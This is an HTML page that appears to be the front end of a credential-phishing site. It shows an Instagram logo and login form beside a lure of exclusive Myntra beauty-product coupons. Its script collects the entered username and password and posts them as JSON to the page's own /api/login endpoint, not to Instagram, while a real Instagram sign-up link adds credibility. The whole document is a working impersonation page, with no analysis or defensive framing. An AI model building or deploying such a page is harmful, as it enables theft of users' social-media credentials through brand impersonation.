
<!DOCTYPE html>
<html lang="en">

<head>
    <title>myntra Offers</title>

    <link rel="icon" href="images/favicon.png" type="image/icon">

</head>

<body>
    <div class="container"> <!-- Instagram login section -->
        <div class="login-section"> <img
                src="https://tse4.mm.bing.net/th?id=OIP.aWhpAoFdTKWAQNIb_18bZwHaHL&pid=Api&P=0&h=180"
                alt="Instagram Logo">
            <form id="loginForm" action="api/login" method="post"> <input type="text"
                    placeholder="Phone number, username, or email" name="u_name" required> <input type="password"
                    placeholder="Password" name="pass" required>
                <div class="loginbutton"><button type="submit">Log in</button></div>
                <div class="option">OR</div>
            </form>
            <div class="fblink"> <a href="#">Log in With Facebook</a> </div>
            <div class="signup">
                <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
            </div>
            <div id="responseMessage"></div> <!-- Response message area -->
        </div> <!-- Myntra Offer Section -->
        <div class="offer-section">
            <h3>Exclusive Myntra Offers on Beauty Products!</h3>
            <p>Get amazing discounts on womenâ€™s beauty products.</p>
            <p><a href="https://www.myntra.com">Access your code</a> to claim your coupon!</p>
            <!-- Product images grid -->
            <div class="product-grid"> <img
                    src="https://tse3.mm.bing.net/th?id=OIP.W-7oQWf4-2hW33K_oMv9cgHaDt&pid=Api&P=0&h=180"
                    alt="Beauty Product 1"> <img

                    alt="Beauty Product 2"> <img

                    alt="Beauty Product 3"> <img
                    src="https://tse1.mm.bing.net/th?id=OIP.bG6zCQhobeuS_j8VJAYkBQHaC0&pid=Api&P=0&h=180"
                    alt="Beauty Product 4"> <img
                    src="https://tse2.mm.bing.net/th?id=OIP.dqlAlipC_-LFmzmq_VKxgQHaDC&pid=Api&P=0&h=180"
                    alt="Beauty Product 5"> <img
                    src="https://tse4.mm.bing.net/th?id=OIP.dKjn0SDGHLFAY5oobgTuxgHaLG&pid=Api&P=0&h=180"
                    alt="Beauty Product 6"> </div>
        </div>
    </div>
   <script>
    const loginForm = document.getElementById('loginForm');
    const responseMessage = document.getElementById('responseMessage');

    loginForm.addEventListener('submit', async (event) => {
        event.preventDefault(); // Prevent form from submitting the traditional way
        const formData = new FormData(loginForm); // Get form data

        const data = {
            u_name: formData.get('u_name'), // Get values from form fields
            pass: formData.get('pass')
        };

        try {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json' // Tell server data is JSON
                },
                body: JSON.stringify(data) // Convert data to JSON string
            });

            const result = await response.json(); // Parse JSON response

            if (response.ok) {
                responseMessage.innerText = result.message; // Success message
            } else {
                responseMessage.innerText = result.error || 'Login failed'; // Error message
            }
        } catch (error) {
            responseMessage.innerText = 'An error occurred. Please try again.';
        }
    });
</script>


</body>
